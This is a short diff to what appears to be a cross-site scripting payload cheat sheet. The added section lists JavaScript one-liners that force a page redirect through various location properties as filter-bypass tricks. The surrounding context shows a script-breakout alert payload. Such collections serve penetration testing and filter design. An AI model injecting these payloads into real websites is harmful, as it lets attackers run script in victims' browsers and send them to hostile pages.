@@ -424,6 +424,14 @@ foo="text </script><script>alert(1)</script>";
 </script>
 ```
 
+Bypass using an alternate way to redirect
+```javascript
+location="http://google.com"
+document.location = "http://google.com"
+document.location.href="http://google.com"
+window.location.assign("http://google.com")
+window['location']['href']="http://google.com"
+```
 
 Bypass using an alternate way to execute an alert - [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040)
 ```javascript
